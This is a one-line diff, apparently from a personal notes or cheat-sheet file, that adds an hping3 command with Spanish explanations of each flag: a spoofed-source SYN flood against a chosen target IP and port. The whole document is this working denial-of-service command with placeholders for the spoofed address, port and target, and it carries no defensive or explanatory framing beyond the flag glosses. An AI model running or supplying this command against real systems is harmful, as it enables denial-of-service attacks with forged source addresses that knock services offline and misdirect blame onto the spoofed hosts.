@@ -1,0 +1,1 @@
+hping3 -a [IP que queremos spoofear] -p [Puerto target] -S (Indicamos que son paquetes SYN) --flood (Que inunde con paquetes) [IP target]
